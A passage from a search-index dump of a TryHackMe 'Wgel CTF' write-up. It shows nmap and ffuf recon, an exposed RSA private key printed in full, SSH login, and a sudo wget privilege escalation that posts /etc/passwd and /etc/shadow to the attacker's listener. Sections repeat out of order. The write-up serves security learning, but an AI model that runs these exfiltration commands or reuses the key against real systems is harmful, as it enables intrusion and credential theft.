target: http://10.10.233.55/sitemap/.ssh/FUZZ [Status: 200, Size: 954, Words: 64, Lines: 17, Duration: 165ms] id_rsa [Status: 200, Size: 1675, Words: 7, Lines: 28, Duration: 166ms] [INFO] Starting queued job on target: http://10.10.233.55/sitemap/css/FUZZ [Status: 200, Size: 2841, Words: 147, Lines: 26, Duration: 165ms] [INFO] Starting queued job on target: http://10.10.233.55/sitemap/fonts/FUZZ [Status: 200, Size: 1159, Words: 76, Lines: 18, Duration: 167ms] [INFO] Starting queued job on target: http://10.10.233.55/sitemap/images/FUZZ [Status: 200, Size: 8657, Words: 427, Lines: 55, Duration: 168ms] [INFO] Starting queued job on target: http://10.10.233.55/sitemap/js/FUZZ [Status: 200, Size: 3817, Words: 227, Lines: 30, Duration: 167ms] :: Progress: [4614/4614] :: Job [7/7] :: 115 req/sec :: Duration: [0:00:37] :: Errors: 0 :: \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$ id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380 m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr +J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG /1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv 2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2 p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj 7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97 uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5 hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr 9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod -----END RSA PRIVATE KEY----- 3.Exploitation and Foothold After finding the private key, it's time to login. Give the key the necessary perms and gain access to the machine. Remember the name found during enumeration? It could be the username to the private key. \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$ ssh -i id_rsa jessie@10.10.233.55 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 8 packages can be updated. 8 updates are security updates. jessie@CorpOne:~$ jessie@CorpOne:~$ Hell YEAH!!! it was Looking around I get the user flag. Checking what I can do with sudo, I find jessie can run \"/usr/bin/wget\" without being asking for the password. jessie@CorpOne:~/Documents$ sudo -l Matching Defaults entries for jessie on CorpOne: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jessie may run the following commands on CorpOne: (ALL : ALL) ALL (root) NOPASSWD: /usr/bin/wget jessie@CorpOne:~/Documents$ Time for Privesc 4.Privesc Since I can edit, download and upload any files, I'll try to privesc like this: download /etc/passwd and /etc/shadow files. Modify the root hash to a password of my own choosing, download them into the target machine and then use the modified fils to privesc Download the files Start a netcat listener on my machine and output the content to files which I'll edit. jessie@CorpOne:/etc$ sudo /usr/bin/wget --post-file=passwd 10.8.86.252:8080 --2022-07-23 21:43:19-- http://10.8.86.252:8080/ Connecting to 10.8.86.252:8080... connected. HTTP request sent, awaiting response... ^C jessie@CorpOne:/etc$ sudo /usr/bin/wget --post-file=shadow 10.8.86.252:8080 --2022-07-23 21:40:30-- http://10.8.86.252:8080/ Connecting to 10.8.86.252:8080... connected. HTTP request sent, awaiting response... ^C jessie@CorpOne:/etc$ Generate hash with Openssl Modify The root hash on both the passwd and shadow file (I decided to edit both just to make sure there are no hitches) Passwd File Shadow File Upload the files to target And Escalate","title":"THM Easy Box - Wgel CTF"},{"location":"Writeups/2022-07-23-Wgel-CTF/#thm-easy-box-wgel-ctf","text":"","title":"THM Easy Box - Wgel CTF"},{"location":"Writeups/2022-07-23-Wgel-CTF/#1recon","text":"","title":"1.Recon"},{"location":"Writeups/2022-07-23-Wgel-CTF/#nmap","text":"\u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$ cat tcp_ports # Nmap 7.92 scan initiated Sat Jul 23 19:36:22 2022 as: nmap -p- --min-rate 10000 --max-rate 11000 -Pn -v -oN tcp_ports 10.10.233.55 Increasing send delay for 10.10.233.55 from 0 to 5 due to 182 out of 605 dropped probes since last increase. Increasing send delay for 10.10.233.55 from 5 to 10 due to 76 out of 252 dropped probes since last increase. Increasing send delay for 10.10.233.55 from 80 to 160 due to 14 out of 46 dropped probes since last increase. Warning: 10.10.233.55 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.233.55 Host is up (0.17s latency). Not shown: 35259 filtered tcp ports (no-response), 30274 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Read data files from: /usr/bin/../share/nmap # Nmap done at Sat Jul 23 19:37:52 2022 -- 1 IP address (1 host up) scanned in 90.80 seconds \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$","title":"Nmap"},{"location":"Writeups/2022-07-23-Wgel-CTF/#2enumeration","text":"","title":"2.Enumeration"},{"location":"Writeups/2022-07-23-Wgel-CTF/#nmap-port-80-and-port-22","text":"Checking the source code of the default page on port 80 for any source code vulns, I find a name which could prove useful later \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$ cat 80_22 # Nmap 7.92 scan initiated Sat Jul 23 19:45:27 2022 as: nmap -p 22,80 -Pn -v -oN 80_22 -sC -sV --script vuln 10.10.233.55 Nmap scan report for 10.10.233.55 Host is up (0.28s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | vulners: | cpe:/a:openbsd:openssh:7.2p2: | PACKETSTORM:140070 7.8 https://vulners.com/packetstorm/PACKETSTORM:140070 *EXPLOIT* | EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09 7.8 https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09 *EXPLOIT* | EDB-ID:40888 7.8 https://vulners.com/exploitdb/EDB-ID:40888 *EXPLOIT* | CVE-2016-8858 7.8 https://vulners.com/cve/CVE-2016-8858 | CVE-2016-6515 7.8 https://vulners.com/cve/CVE-2016-6515 | 1337DAY-ID-26494 7.8 https://vulners.com/zdt/1337DAY-ID-26494 *EXPLOIT* | SSV:92579 7.5 https://vulners.com/seebug/SSV:92579 *EXPLOIT* | CVE-2016-10009 7.5 https://vulners.com/cve/CVE-2016-10009 | 1337DAY-ID-26576 7.5 https://vulners.com/zdt/1337DAY-ID-26576 *EXPLOIT* | SSV:92582 7.2 https://vulners.com/seebug/SSV:92582 *EXPLOIT* | CVE-2016-10012 7.2 https://vulners.com/cve/CVE-2016-10012 | CVE-2015-8325 7.2 https://vulners.com/cve/CVE-2015-8325 | SSV:92580 6.9 https://vulners.com/seebug/SSV:92580 *EXPLOIT* | CVE-2016-10010 6.9 https://vulners.com/cve/CVE-2016-10010 | 1337DAY-ID-26577 6.9 https://vulners.com/zdt/1337DAY-ID-26577 *EXPLOIT* | EXPLOITPACK:98FE96309F9524B8C84C508837551A19 5.8 https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19 *EXPLOIT* | EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97 5.8 https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97 *EXPLOIT* | EDB-ID:46516 5.8 https://vulners.com/exploitdb/EDB-ID:46516 *EXPLOIT* | EDB-ID:46193 5.8 https://vulners.com/exploitdb/EDB-ID:46193 *EXPLOIT* | CVE-2019-6111 5.8 https://vulners.com/cve/CVE-2019-6111 | 1337DAY-ID-32328 5.8 https://vulners.com/zdt/1337DAY-ID-32328 *EXPLOIT* | 1337DAY-ID-32009 5.8 https://vulners.com/zdt/1337DAY-ID-32009 *EXPLOIT* | SSV:91041 5.5 https://vulners.com/seebug/SSV:91041 *EXPLOIT* | PACKETSTORM:140019 5.5 https://vulners.com/packetstorm/PACKETSTORM:140019 *EXPLOIT* | PACKETSTORM:136234 5.5 https://vulners.com/packetstorm/PACKETSTORM:136234 *EXPLOIT* | EXPLOITPACK:F92411A645D85F05BDBD274FD222226F 5.5 https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F *EXPLOIT* | EXPLOITPACK:9F2E746846C3C623A27A441281EAD138 5.5 https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138 *EXPLOIT* | EXPLOITPACK:1902C998CBF9154396911926B4C3B330 5.5 https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330 *EXPLOIT* | EDB-ID:40858 5.5 https://vulners.com/exploitdb/EDB-ID:40858 *EXPLOIT* | EDB-ID:40119 5.5 https://vulners.com/exploitdb/EDB-ID:40119 *EXPLOIT* | EDB-ID:39569 5.5 https://vulners.com/exploitdb/EDB-ID:39569 *EXPLOIT* | CVE-2016-3115 5.5 https://vulners.com/cve/CVE-2016-3115 | SSH_ENUM 5.0 https://vulners.com/canvas/SSH_ENUM *EXPLOIT* | PACKETSTORM:150621 5.0 https://vulners.com/packetstorm/PACKETSTORM:150621 *EXPLOIT* | EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0 5.0 https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0 *EXPLOIT* | EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283 5.0 https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283 *EXPLOIT* | EDB-ID:45939 5.0 https://vulners.com/exploitdb/EDB-ID:45939 *EXPLOIT* | EDB-ID:45233 5.0 https://vulners.com/exploitdb/EDB-ID:45233 *EXPLOIT* | CVE-2018-15919 5.0 https://vulners.com/cve/CVE-2018-15919 | CVE-2018-15473 5.0 https://vulners.com/cve/CVE-2018-15473 | CVE-2017-15906 5.0 https://vulners.com/cve/CVE-2017-15906 | CVE-2016-10708 5.0 https://vulners.com/cve/CVE-2016-10708 | 1337DAY-ID-31730 5.0 https://vulners.com/zdt/1337DAY-ID-31730 *EXPLOIT* | CVE-2021-41617 4.4 https://vulners.com/cve/CVE-2021-41617 | EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF 4.3 https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF *EXPLOIT* | EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF 4.3 https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF *EXPLOIT* | EDB-ID:40136 4.3 https://vulners.com/exploitdb/EDB-ID:40136 *EXPLOIT* | EDB-ID:40113 4.3 https://vulners.com/exploitdb/EDB-ID:40113 *EXPLOIT* | CVE-2020-14145 4.3 https://vulners.com/cve/CVE-2020-14145 | CVE-2016-6210 4.3 https://vulners.com/cve/CVE-2016-6210 | 1337DAY-ID-25440 4.3 https://vulners.com/zdt/1337DAY-ID-25440 *EXPLOIT* | 1337DAY-ID-25438 4.3 https://vulners.com/zdt/1337DAY-ID-25438 *EXPLOIT* | CVE-2019-6110 4.0 https://vulners.com/cve/CVE-2019-6110 | CVE-2019-6109 4.0 https://vulners.com/cve/CVE-2019-6109 | CVE-2018-20685 2.6 https://vulners.com/cve/CVE-2018-20685 | SSV:92581 2.1 https://vulners.com/seebug/SSV:92581 *EXPLOIT* | CVE-2016-10011 2.1 https://vulners.com/cve/CVE-2016-10011 | PACKETSTORM:151227 0.0 https://vulners.com/packetstorm/PACKETSTORM:151227 *EXPLOIT* | PACKETSTORM:140261 0.0 https://vulners.com/packetstorm/PACKETSTORM:140261 *EXPLOIT* | PACKETSTORM:138006 0.0 https://vulners.com/packetstorm/PACKETSTORM:138006 *EXPLOIT* | PACKETSTORM:137942 0.0 https://vulners.com/packetstorm/PACKETSTORM:137942 *EXPLOIT* | MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- 0.0 https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT* |_ 1337DAY-ID-30937 0.0 https://vulners.com/zdt/1337DAY-ID-30937 *EXPLOIT* 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server's resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | http://ha.ckers.org/slowloris/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities. |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-dombased-xss: Couldn't find any DOM based XSS. |_http-csrf: Couldn't find any CSRF vulnerabilities. | vulners: | cpe:/a:apache:http_server:2.4.18: | CVE-2022-31813 7.5 https://vulners.com/cve/CVE-2022-31813 | CVE-2022-23943 7.5 https://vulners.com/cve/CVE-2022-23943 | CVE-2022-22720 7.5 https://vulners.com/cve/CVE-2022-22720 | CVE-2021-44790 7.5 https://vulners.com/cve/CVE-2021-44790 | CVE-2021-39275 7.5 https://vulners.com/cve/CVE-2021-39275 | CVE-2021-26691 7.5 https://vulners.com/cve/CVE-2021-26691 | CVE-2017-7679 7.5 https://vulners.com/cve/CVE-2017-7679 | CVE-2017-3169 7.5 https://vulners.com/cve/CVE-2017-3169 | CVE-2017-3167 7.5 https://vulners.com/cve/CVE-2017-3167 | EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB 7.2 https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB *EXPLOIT* | EDB-ID:46676 7.2 https://vulners.com/exploitdb/EDB-ID:46676 *EXPLOIT* | CVE-2019-0211 7.2 https://vulners.com/cve/CVE-2019-0211 | 1337DAY-ID-32502 7.2 https://vulners.com/zdt/1337DAY-ID-32502 *EXPLOIT* | FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8 6.8 https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8 *EXPLOIT* | CVE-2022-22721 6.8 https://vulners.com/cve/CVE-2022-22721 | CVE-2021-40438 6.8 https://vulners.com/cve/CVE-2021-40438 | CVE-2020-35452 6.8 https://vulners.com/cve/CVE-2020-35452 | CVE-2018-1312 6.8 https://vulners.com/cve/CVE-2018-1312 | CVE-2017-15715 6.8 https://vulners.com/cve/CVE-2017-15715 | 8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2 6.8 https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2 *EXPLOIT* | 4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332 6.8 https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332 *EXPLOIT* | 4373C92A-2755-5538-9C91-0469C995AA9B 6.8 https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B *EXPLOIT* | 0095E929-7573-5E4A-A7FA-F6598A35E8DE 6.8 https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE *EXPLOIT* | CVE-2022-28615 6.4 https://vulners.com/cve/CVE-2022-28615 | CVE-2021-44224 6.4 https://vulners.com/cve/CVE-2021-44224 | CVE-2019-10082 6.4 https://vulners.com/cve/CVE-2019-10082 | CVE-2017-9788 6.4 https://vulners.com/cve/CVE-2017-9788 | CVE-2019-0217 6.0 https://vulners.com/cve/CVE-2019-0217 | CVE-2020-1927 5.8 https://vulners.com/cve/CVE-2020-1927 | CVE-2019-10098 5.8 https://vulners.com/cve/CVE-2019-10098 | 1337DAY-ID-33577 5.8 https://vulners.com/zdt/1337DAY-ID-33577 *EXPLOIT* | CVE-2016-5387 5.1 https://vulners.com/cve/CVE-2016-5387 | SSV:96537 5.0 https://vulners.com/seebug/SSV:96537 *EXPLOIT* | EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D 5.0 https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D *EXPLOIT* | EXPLOITPACK:2666FB0676B4B582D689921651A30355 5.0 https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355 *EXPLOIT* | EDB-ID:42745 5.0 https://vulners.com/exploitdb/EDB-ID:42745 *EXPLOIT* | EDB-ID:40909 5.0 https://vulners.com/exploitdb/EDB-ID:40909 *EXPLOIT* | CVE-2022-30556 5.0 https://vulners.com/cve/CVE-2022-30556 | CVE-2022-30522 5.0 https://vulners.com/cve/CVE-2022-30522 | CVE-2022-29404 5.0 https://vulners.com/cve/CVE-2022-29404 | CVE-2022-28614 5.0 https://vulners.com/cve/CVE-2022-28614 | CVE-2022-26377 5.0 https://vulners.com/cve/CVE-2022-26377 | CVE-2022-22719 5.0 https://vulners.com/cve/CVE-2022-22719 | CVE-2021-34798 5.0 https://vulners.com/cve/CVE-2021-34798 | CVE-2021-33193 5.0 https://vulners.com/cve/CVE-2021-33193 | CVE-2021-26690 5.0 https://vulners.com/cve/CVE-2021-26690 | CVE-2020-1934 5.0 https://vulners.com/cve/CVE-2020-1934 | CVE-2019-17567 5.0 https://vulners.com/cve/CVE-2019-17567 | CVE-2019-0220 5.0 https://vulners.com/cve/CVE-2019-0220 | CVE-2019-0196 5.0 https://vulners.com/cve/CVE-2019-0196 | CVE-2018-17199 5.0 https://vulners.com/cve/CVE-2018-17199 | CVE-2018-17189 5.0 https://vulners.com/cve/CVE-2018-17189 | CVE-2018-1333 5.0 https://vulners.com/cve/CVE-2018-1333 | CVE-2018-1303 5.0 https://vulners.com/cve/CVE-2018-1303 | CVE-2017-9798 5.0 https://vulners.com/cve/CVE-2017-9798 | CVE-2017-15710 5.0 https://vulners.com/cve/CVE-2017-15710 | CVE-2016-8743 5.0 https://vulners.com/cve/CVE-2016-8743 | CVE-2016-8740 5.0 https://vulners.com/cve/CVE-2016-8740 | CVE-2016-4979 5.0 https://vulners.com/cve/CVE-2016-4979 | 1337DAY-ID-28573 5.0 https://vulners.com/zdt/1337DAY-ID-28573 *EXPLOIT* | CVE-2019-0197 4.9 https://vulners.com/cve/CVE-2019-0197 | CVE-2020-11985 4.3 https://vulners.com/cve/CVE-2020-11985 | CVE-2019-10092 4.3 https://vulners.com/cve/CVE-2019-10092 | CVE-2018-1302 4.3 https://vulners.com/cve/CVE-2018-1302 | CVE-2018-1301 4.3 https://vulners.com/cve/CVE-2018-1301 | CVE-2018-11763 4.3 https://vulners.com/cve/CVE-2018-11763 | CVE-2016-4975 4.3 https://vulners.com/cve/CVE-2016-4975 | CVE-2016-1546 4.3 https://vulners.com/cve/CVE-2016-1546 | 4013EC74-B3C1-5D95-938A-54197A58586D 4.3 https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D *EXPLOIT* | 1337DAY-ID-33575 4.3 https://vulners.com/zdt/1337DAY-ID-33575 *EXPLOIT* | CVE-2018-1283 3.5 https://vulners.com/cve/CVE-2018-1283 | CVE-2016-8612 3.3 https://vulners.com/cve/CVE-2016-8612 |_ PACKETSTORM:152441 0.0 https://vulners.com/packetstorm/PACKETSTORM:152441 *EXPLOIT* Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jul 23 19:50:59 2022 -- 1 IP address (1 host up) scanned in 331.69 seconds \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$","title":"Nmap Port 80 and Port 22"},{"location":"Writeups/2022-07-23-Wgel-CTF/#port-80","text":"Using ffuf I do a recursive directory bruteforce scan which proves useful...there is a private key hosted on the server that I think will help to login into ssh \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$ ffuf -u http://10.10.233.55/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac -recursion /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive <3 ________________________________________________ :: Method : GET :: URL : http://10.10.233.55/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : true :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ [Status: 200, Size: 11374, Words: 3512, Lines: 379, Duration: 168ms] index.html [Status: 200, Size: 11374, Words: 3512, Lines: 379, Duration: 166ms] sitemap [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 164ms] [INFO] Adding a new job to the queue: http://10.10.233.55/sitemap/FUZZ [INFO] Starting queued job on target: http://10.10.233.55/sitemap/FUZZ .ssh [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 174ms] [INFO] Adding a new job to the queue: http://10.10.233.55/sitemap/.ssh/FUZZ [Status: 200, Size: 21080, Words: 1305, Lines: 517, Duration: 173ms] css [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 170ms] [INFO] Adding a new job to the queue: http://10.10.233.55/sitemap/css/FUZZ fonts [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 165ms] [INFO] Adding a new job to the queue: http://10.10.233.55/sitemap/fonts/FUZZ images [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 166ms] [INFO] Adding a new job to the queue: http://10.10.233.55/sitemap/images/FUZZ index.html [Status: 200, Size: 21080, Words: 1305, Lines: 517, Duration: 171ms] js [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 165ms] [INFO] Adding a new job to the queue: http://10.10.233.55/sitemap/js/FUZZ [INFO] Starting queued job on target: http://10.10.233.55/sitemap/.ssh/FUZZ [Status: 200, Size: 954, Words: 64, Lines: 17, Duration: 165ms] id_rsa [Status: 200, Size: 1675, Words: 7, Lines: 28, Duration: 166ms] [INFO] Starting queued job on target: http://10.10.233.55/sitemap/css/FUZZ [Status: 200, Size: 2841, Words: 147, Lines: 26, Duration: 165ms] [INFO] Starting queued job on target: http://10.10.233.55/sitemap/fonts/FUZZ [Status: 200, Size: 1159, Words: 76, Lines: 18, Duration: 167ms] [INFO] Starting queued job on target: http://10.10.233.55/sitemap/images/FUZZ [Status: 200, Size: 8657, Words: 427, Lines: 55, Duration: 168ms] [INFO] Starting queued job on target: http://10.10.233.55/sitemap/js/FUZZ [Status: 200, Size: 3817, Words: 227, Lines: 30, Duration: 167ms] :: Progress: [4614/4614] :: Job [7/7] :: 115 req/sec :: Duration: [0:00:37] :: Errors: 0 :: \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$","title":"PORT 80"},{"location":"Writeups/2022-07-23-Wgel-CTF/#id_rsa","text":"-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380 m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr +J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG /1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv 2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2 p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj 7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97 uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5 hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr 9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod -----END RSA PRIVATE KEY-----","title":"id_rsa"},{"location":"Writeups/2022-07-23-Wgel-CTF/#3exploitation-and-foothold","text":"After finding the private key, it's time to login. Give the key the necessary perms and gain access to the machine. Remember the name found during enumeration? It could be the username to the private key. \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$ ssh -i id_rsa jessie@10.10.233.55 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 8 packages can be updated. 8 updates are security updates. jessie@CorpOne:~$ jessie@CorpOne:~$ Hell YEAH!!! it was Looking around I get the user flag. Checking what I can do with sudo, I find jessie can run \"/usr/bin/wget\" without being asking for the password. jessie@CorpOne:~/Documents$ sudo -l Matching Defaults entries for jessie on CorpOne: 